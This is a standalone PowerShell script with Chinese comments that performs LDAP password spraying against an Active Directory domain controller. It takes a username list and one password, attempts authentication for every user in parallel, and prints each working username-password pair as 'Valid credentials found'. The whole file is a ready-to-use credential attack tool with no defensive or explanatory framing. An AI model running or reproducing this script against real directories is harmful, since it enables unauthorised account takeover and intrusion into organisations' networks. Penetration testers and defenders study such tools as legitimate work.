#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][Alias("u")][string]$UserFile,
    [Parameter(Mandatory = $true)][Alias("p")][string]$Password,
    [Parameter(Mandatory = $true)][Alias("d")][string]$Domain,
    [Parameter(Mandatory = $true)][Alias("dc")][string]$DomainController,
    [Alias("t")][int]$Threads = 5,
    [switch]$NoColor
)

BEGIN {
    Add-Type -AssemblyName System.DirectoryServices.Protocols

    # 颜色配置
    $successColor = if (-not $NoColor) { 'Green' } else { $host.UI.RawUI.ForegroundColor }
    $progressColor = if (-not $NoColor) { 'Yellow' } else { $host.UI.RawUI.ForegroundColor }
    $errorColor = if (-not $NoColor) { 'Red' } else { $host.UI.RawUI.ForegroundColor }
    $resetColor = if (-not $NoColor) { [char]0x1b + '[0m' } else { '' }

    # 用户列表处理
    $users = Get-Content $UserFile | ForEach-Object {
        if ($_ -notmatch '\\') { 
            [PSCustomObject]@{
                Original = $_
                Formatted = "$Domain\$_"
            }
        } else {
            [PSCustomObject]@{
                Original = $_
                Formatted = $_
            }
        }
    }
    $total = $users.Count
    $counter = 0
}

PROCESS {
    # 创建运行空间池
    $pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads)
    $pool.Open()
    $jobs = New-Object System.Collections.ArrayList

    # 处理每个用户
    foreach ($user in $users) {
        $counter++
        
        # 实时显示进度
        $progressInfo = "[$counter/$total] Attempting: $($user.Formatted):$Password"
        if (-not $NoColor) {
            Write-Host "$progressInfo" -ForegroundColor $progressColor
        }
        else {
            Write-Host $progressInfo
        }

        # 创建异步任务
        $ps = [PowerShell]::Create().AddScript({
            param($u, $p, $dc, $d)
            
            try {
                # LDAP认证核心逻辑保持不变
                $cred = New-Object System.Net.NetworkCredential($u.Formatted, $p)
                $conn = New-Object System.DirectoryServices.Protocols.LdapConnection(
                    $dc,
                    $cred,
                    [System.DirectoryServices.Protocols.AuthType]::Basic
                )
                $conn.SessionOptions.Sealing = $true
                $conn.SessionOptions.Signing = $true
                $conn.Bind()
                $conn.Dispose()
                return @{Success=$true; Credential="$($u.Formatted):$p"}
            }
            catch [System.DirectoryServices.Protocols.LdapException] {
                return @{Success=$false}
            }
            catch {
                Write-Warning "Error for $($u.Formatted) : $_"
                return @{Success=$false}
            }
        }).AddArgument($user).AddArgument($Password).AddArgument($DomainController).AddArgument($Domain)

        $ps.RunspacePool = $pool
        $jobs.Add([PSCustomObject]@{
            Handle = $ps.BeginInvoke()
            PowerShell = $ps
            User = $user
        }) | Out-Null
    }

    # 收集结果
    $ValidCredentials = New-Object System.Collections.ArrayList
    foreach ($job in $jobs) {
        $result = $job.PowerShell.EndInvoke($job.Handle)
        if ($result.Success) {
            $ValidCredentials.Add($result.Credential) | Out-Null
        }
        $job.PowerShell.Dispose()
    }
}

END {
    # 输出结果
    if ($ValidCredentials.Count -gt 0) {
        Write-Host "`nValid credentials found:" -ForegroundColor $successColor
        $ValidCredentials | ForEach-Object { Write-Host "  $_" -ForegroundColor $successColor }
    }
    else {
        Write-Host "`nNo valid credentials found!" -ForegroundColor $errorColor
    }

    $pool.Close()
    $pool.Dispose()
}